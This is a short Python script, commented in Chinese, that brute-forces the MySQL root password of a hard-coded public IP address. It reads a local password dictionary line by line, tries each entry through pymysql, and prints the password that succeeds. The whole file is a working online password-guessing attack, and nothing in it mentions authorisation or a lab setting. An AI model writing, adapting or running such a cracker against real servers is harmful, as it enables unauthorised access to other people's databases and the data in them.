# coding:utf-8
import pymysql  # 导入连接数据库的模块


class PoJie:
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")  # 打开密码字典文件

    def LianJieMySql(self, word):  # 连接数据库的方法
        try:
            db = pymysql.connect("39.99.133.231", "root", word)  # 连接数据库
            # pymysql.connect()方法的第一个参数是ip地址，本机可以用localhost代替
            # 第二个参数是账户名，本文章为知道用户名情况破解密码
            # 第三个是密码，
            db.close()  # 关闭数据库
            return True  # 连接成功返回True
        except:
            return False

    def PoJieChangShi(self):  # 读取密码字典的方法
        while True:  # 循环读取
            mystr = self.file.readline()  # 读取密码字典的一行
            if not mystr:  # 如果读到文件最后没有数据了，就跳出循环
                break
            if self.LianJieMySql(mystr):  # 把读到的一行密码传到连接数据库方法里面
                # 如果返回了True说明破解成功
                print("密码正确----", mystr)  # 打印正确密码
                break  # 结束循环
            else:
                print("密码错误", mystr)

    def __del__(self):  # 无论如何最终要执行的方法
        self.file.close()  # 关闭密码字典文件
        pass


path = r"F:\mysql_pojie\mysql_pwd_crack\passwords.txt"  # 传入密码字典绝对文件路径
start = PoJie(path)  # 实例化对象
start.PoJieChangShi()  # 对象执行方法

